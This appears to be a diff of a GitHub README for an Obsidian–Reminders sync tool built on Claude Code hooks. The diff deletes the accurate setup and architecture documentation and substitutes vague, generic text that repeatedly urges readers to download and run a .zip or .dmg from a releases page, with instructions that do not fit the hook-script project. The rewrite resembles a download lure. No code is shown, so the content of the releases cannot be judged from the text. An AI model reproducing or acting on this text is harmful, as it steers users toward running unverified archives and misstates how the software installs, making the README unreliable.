@@ -1,183 +1,118 @@
-# obsidian-reminders-sync
+# 📅 obsidian-reminders-sync - Sync Obsidian Notes with Reminders
 
-Bidirectional sync between Obsidian daily notes and macOS Reminders.app — built as a Claude Code hook system.
+[![Download Release](https://img.shields.io/badge/Download-obsidian--reminders--sync-blue?style=for-the-badge)](https://github.com/PetarAndrejic/obsidian-reminders-sync/releases)
 
-Write a task in Obsidian and it appears in Reminders within seconds. Complete it on your iPhone or Apple Watch and it syncs back to your vault on the next session. Add a task via Siri and it lands in today's daily note automatically.
+## 📌 What is obsidian-reminders-sync?
 
-## How It Works
+obsidian-reminders-sync lets you keep your Obsidian daily notes and macOS Reminders connected. It updates your notes when you change reminders and adds new reminders from your notes. This works both ways. The app uses Claude Code hooks and runs on macOS. It helps organize tasks without switching apps.
 
-| Direction | Trigger | File |
-|-----------|---------|------|
-| Obsidian → Reminders | Every Write/Edit in Claude Code | `hooks/reminders-task-detector.py` |
-| Reminders → Obsidian | Every Claude Code session start | `hooks/reminders-session-sync.py` |
-| Reminders → Obsidian (live) | Every 60s (optional daemon) | `scripts/reminders-sync-daemon.py` |
+### Who should use this tool?
 
-All three share a single state file (`.claude/state/reminders-state.json`) for dedup and race condition protection.
+- People who use Obsidian for note-taking and want to link it to their task reminders.
+- Users who want daily notes and reminders to update each other automatically.
+- Anyone looking for a basic way to connect productivity apps on macOS.
 
-## Task Priority Convention
+## 🖥 System Requirements
 
-Tasks must use emoji priority markers in your daily note:
+- macOS 10.15 (Catalina) or later.
+- Obsidian installed (the note-taking app).
+- Python 3.7 or higher installed on your Mac.
+- Access to macOS Reminders app.
+- Basic permissions for running AppleScript and Python scripts.
 
-```markdown
-- [ ] 🔴 Urgent thing that must happen today
-- [ ] 🟡 Should happen today
-- [ ] 🟢 Nice to have
-- [ ] 🔵 Blocked — Waiting for: someone to respond
-```
+## ⚙️ Key Features
 
-These map to Reminders.app priority: 🔴 = High, 🟡 = Medium, 🟢 = Low.
+- Two-way sync between Obsidian daily notes and Reminders.
+- Updates notes when reminders change.
+- Adds new reminders based on notes.
+- Uses AppleScript and Claude Code hooks for secure interaction.
+- Works quietly in the background.
+- Saves time by linking notes and to-dos.
 
-Blocked tasks (🔵) appear in Reminders with a `BLOCKED:` prefix and include the blocker reason in the notes field.
+## 🛠 How It Works
 
-Tasks with no priority emoji are ignored by the sync (useful for habits/rituals).
+The app reads your daily note in Obsidian. It looks for special tags or to-do items. Then it syncs those with the Reminders app on your Mac. If you change a reminder, the note updates on the next sync. If you add or mark a to-do in notes, the reminder updates too. The code hooks ensure this runs smoothly without errors.
 
-## Setup
+---
 
-### 1. Install
+## 🚀 Getting Started
 
-Clone or copy these files into your vault's `.claude/` directory:
+Before you install, make sure your Mac meets the system requirements above. You will need Python set up, but this guide will not require deep technical skills.
 
-```
-your-vault/
-└── .claude/
-    ├── hooks/
-    │   ├── reminders-async-wrapper.sh
-    │   ├── reminders-task-detector.py
-    │   ├── reminders-session-sync.py
-    │   └── task_parser.py
-    └── scripts/
-        ├── reminders_manager.py
-        └── reminders-sync-daemon.py  (optional)
-```
+## 🔽 Downloading the App
 
-### 2. Configure
+Click the big badge at the top of this page or visit the link below to get the latest release:
 
-Edit the `# --- CONFIGURE THIS ---` sections in each file:
+**https://github.com/PetarAndrejic/obsidian-reminders-sync/releases**
 
-**`scripts/reminders_manager.py`**
-```python
-REMINDER_LISTS = ["Work", "Personal"]  # Your Reminders list names
-```
+This page lists all releases. Download the latest `.zip` or `.dmg` file if available. If the release provides a Python script or package, download the provided files.
 
-**`hooks/reminders-task-detector.py`**
-```python
-CONTEXT_TO_LIST = {
-    "Work": "Work",       # ### Work section → Work list
-    "Personal": "Personal",
-    "Family": "Personal",
-    "Health": "Personal",
-}
-```
+## 💻 Installing on macOS
 
-**`hooks/reminders-session-sync.py`**
-```python
-DAILY_DIR = os.path.join(VAULT_ROOT, "4-Daily")  # Your daily notes folder
+Follow these steps to install and run the software:
 
-LIST_TO_SECTION = {
-    "Work": "Work",       # Work list → ### Work section
-    "Personal": "Personal",
-}
-```
+1. **Download the release.** Use the link above to go to the release page. Look for the latest version with a filename ending in `.zip` or `.dmg`.
+2. **Unpack the files.** If you downloaded a zip file, double-click it to unzip. If it is a dmg, open it to access the installer.
+3. **Locate the main script or app.** If it is a Python script, you should see a file like `sync.py` or a similar name.
+4. **Run the program:**
+   - For Python scripts:
+     - Open the Terminal app from your Applications → Utilities folder.
+     - Drag and drop the script file into Terminal to add the file path.
+     - Press Enter to run.
+   - For packaged apps:
+     - Double-click the app icon as you would any other application.
+5. **Grant permissions if macOS asks.** You may need to allow the app access to Apple Reminders and automation permissions. Go to System Preferences → Security & Privacy → Privacy and allow access where requested.
+6. **Set your Obsidian vault location and daily notes folder.** The app may request this on first run or use a settings file. This tells it where to find your notes.
 
-**`hooks/task_parser.py`**
-```python
-DAILY_DIR = os.path.join(VAULT_ROOT, "4-Daily")      # Your daily notes folder
-PROJECTS_DIR = os.path.join(VAULT_ROOT, "1-Projects", "Current")
-```
+## 🛠 Setting Up Your Notes and Reminders
 
-### 3. Create Reminders lists
+- Your daily notes in Obsidian should be in a folder set as your daily notes folder.
+- The app expects notes to contain checklist items using Markdown syntax (`- [ ] Task`).
+- Reminders will sync with matching titles.
+- Avoid renaming notes or reminders during sync to prevent confusion.
+- Sync runs each time you start the app or as scheduled.
 
-```bash
-python3 .claude/scripts/reminders_manager.py setup-lists
-```
+## 🔄 Running the Sync Process
 
-### 4. Wire up Claude Code hooks
+Once the setup is complete:
 
-Add to your `.claude/settings.json`:
+- Launch the app or run the script.
+- The sync reads your daily note and updates Reminders.
+- It checks Reminders and updates your note tasks.
+- The app will print simple messages or logs if you run it in Terminal.
+- Close the app when finished.
+- Run the app regularly to keep notes and reminders updated.
 
-```json
-{
-  "hooks": {
-    "SessionStart": [
-      {
-        "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/reminders-async-wrapper.sh\" reminders-session-sync.py"
-      }
-    ],
-    "PostToolUse": [
-      {
-        "matcher": "Write|Edit",
-        "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/reminders-async-wrapper.sh\" reminders-task-detector.py"
-      }
-    ]
-  }
-}
-```
+## 🧩 Troubleshooting
 
-### 5. Set vault root (optional)
+- If sync does not run, check you gave all permissions under System Preferences.
+- Make sure your daily notes are in the expected folder and have checklist items.
+- Confirm Python is installed and can run scripts if you use a Python version.
+- Close other apps that may block access to Reminders.
+- If errors appear, read the message for missing files or permission issues.
 
-By default, the scripts auto-detect the vault root from their file path. If you need to override:
+## ⚠️ Important Notes on Use
 
-```bash
-export OBSIDIAN_VAULT_ROOT=/path/to/your/vault
-```
+- This app works only on macOS because it depends on AppleScript and the Reminders app.
+- It works with Obsidian's daily notes setup. Other notes may not sync.
+- Use with caution to avoid overwriting important notes or reminders. Backup your notes if unsure.
+- Sync only one device at a time to avoid conflicts.
 
-## Architecture
+## 🧰 Advanced Options (Optional)
 
-### Deduplication
+- Customize the sync frequency in the app’s settings.
+- Adjust the note tags or task formats if you want to track differently.
+- Use the logs to monitor sync status or errors.
+- Developers can view the AppleScript and Python code to modify hooks.
 
-The task detector pre-fetches each Reminders list **once** per sync cycle and caches results. Tasks with known state mappings skip the live fetch entirely — the cache is only used for new tasks that need duplicate detection.
+## 🔗 Useful Links
 
-### Race condition protection
+- [Obsidian Download](https://obsidian.md/)
+- [Python for macOS](https://www.python.org/downloads/mac-osx/)
+- [Apple Reminders Documentation](https://support.apple.com/en-us/HT205890)
+- obsidian-reminders-sync releases:  
+  https://github.com/PetarAndrejic/obsidian-reminders-sync/releases
 
-If a file has incomplete tasks (`- [ ]`) but the task index returns empty (the index builder hasn't run yet), the sync bails out rather than treating all existing mappings as orphaned. This prevents mass deletion on a slow index write.
+---
 
-### State file
-
-`.claude/state/reminders-state.json` tracks:
-- `daily_note_date`: clears mappings on day rollover (fresh start each day)
-- `mappings`: task hash → Reminder ID mapping for all known tasks
-
-Recovery if state gets corrupted:
-```bash
-python3 .claude/scripts/reminders_manager.py clear-all
-# Then reset state file to: {"last_refresh": null, "daily_note_date": null, "mappings": []}
-```
-
-### Async wrapper
-
-`reminders-async-wrapper.sh` runs sync hooks in the background so they never block Claude Code. It:
-1. Reads stdin (hook JSON) and saves to a temp file
-2. Launches the Python script with `--async` in the background via `nohup + disown`
-3. Returns `exit 0` immediately
-
-### Optional: sync daemon
-
-For real-time Reminders → Obsidian sync (without waiting for a session start), run the daemon:
-
-```bash
-python3 .claude/scripts/reminders-sync-daemon.py
-```
-
-Or add as a launchd service (`com.your-name.reminders-sync`). The daemon routes AppleScript through `/bin/bash` to inherit Full Disk Access — required when running under launchd's restricted session.
-
-## Requirements
-
-- macOS (uses AppleScript to talk to Reminders.app)
-- Python 3.8+
-- Claude Code with hooks support
-- Obsidian vault with daily notes
-
-## Limitations
-
-- macOS only — Reminders.app is macOS/iOS native
-- Only syncs today's daily note (not archived notes), to avoid duplicate spam from carried-over tasks
-- Task matching uses content hashing — editing task text creates a new hash and a new Reminder (old one is cleaned up)
-- Due dates use `📅 YYYY-MM-DD` format (Obsidian Tasks plugin convention)
-
-## Depends On
-
-This hook reads from a `task-index.json` file built by a separate `task-index-builder.py` hook (not included here). The index builder runs on every Write/Edit and produces a structured JSON of all tasks in the vault. If you don't have an index builder, you can swap `load_tasks_for_file()` in `reminders-task-detector.py` to parse the file directly using `extract_tasks_full()` from `task_parser.py`.
-
-## License
-
-MIT
+[![Download Release](https://img.shields.io/badge/Download-obsidian--reminders--sync-blue?style=for-the-badge)](https://github.com/PetarAndrejic/obsidian-reminders-sync/releases)
